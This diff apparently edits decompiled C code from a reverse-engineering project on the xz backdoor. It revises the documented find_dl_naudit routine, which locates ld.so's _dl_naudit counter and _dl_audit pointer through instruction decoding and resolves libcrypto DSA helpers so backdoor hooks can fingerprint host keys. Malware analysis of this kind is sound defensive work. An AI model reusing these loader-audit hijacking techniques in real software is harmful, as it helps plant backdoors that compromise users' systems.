@@ -5,14 +5,10 @@
 
 
 /*
- * AutoDoc: Parses `rtld_global_ro` for the `GLRO(dl_naudit)` string, locates the matching LEA inside
- * `_dl_audit_symbind_alt`, and from there recovers the addresses of `_dl_naudit` and
- * `_dl_audit` within ld.so. It also resolves a few extra libcrypto helpers (EVP_MD_CTX_free,
- * DSA_get0_{pqg,pub_key}) so the later monitor hooks can fingerprint host keys. The discovered
- * pointers are stored inside `hooks->ldso_ctx`.
+ * AutoDoc: Harvests the `_dl_naudit` counter and `_dl_audit` pointer from ld.so so the loader can toggle audit modules. After resolving `DSA_get0_pqg`, `DSA_get0_pub_key`, and `EVP_MD_CTX_free` via the fake allocator, it finds `rtld_global_ro`, searches for the `GLRO(dl_naudit)` string reference, and decodes the MOV that loads that slot. The same memory address is then matched inside `_dl_audit_symbind_alt`; if the MOV/TEST pair is found and the slot is still zero, the function records the `_dl_naudit` and `_dl_audit` pointers in `hooks->ldso_ctx`. Any deviation or pre-existing audit module aborts the attempt.
  */
-#include "xzre_types.h"
 
+#include "xzre_types.h"
 
 BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
                    backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)
@@ -37,27 +33,22 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
   u8 *code_start_00;
   uint *mem_address;
   byte bVar14;
-  uchar *rtld_global_ro;
-  char *naudit_string;
-  Elf64_Sym *libcrypto_symbol;
-  dl_audit_symbind_alt_fn audit_stub;
   EncodedStringId local_8c;
-  uint *naudit_slot;
+  u64 local_88;
   dasm_ctx_t local_80;
   
   bVar14 = 0;
   local_8c = 0;
-  naudit_slot = (uint *)0x0;
+  local_88 = 0;
   pEVar5 = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
   if (pEVar5 != (Elf64_Sym *)0x0) {
     local_8c = STR_GLRO_dl_naudit_naudit;
     str = elf_find_string(dynamic_linker_elf,&local_8c,(void *)0x0);
     if (str != (char *)0x0) {
       pEVar6 = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
-      puVar7 = (u8 *)elf_get_code_segment(dynamic_linker_elf,(u64 *)&naudit_slot);
+      puVar7 = (u8 *)elf_get_code_segment(dynamic_linker_elf,&local_88);
       if ((puVar7 != (u8 *)0x0) &&
-         (puVar7 = find_string_reference(puVar7,(u8 *)((long)naudit_slot + (long)puVar7),str),
-         puVar7 != (u8 *)0x0)) {
+         (puVar7 = find_string_reference(puVar7,puVar7 + local_88,str), puVar7 != (u8 *)0x0)) {
         if (pEVar6 != (Elf64_Sym *)0x0) {
           EVar1 = pEVar6->st_value;
           pEVar2 = libcrypto_elf->elfbase;
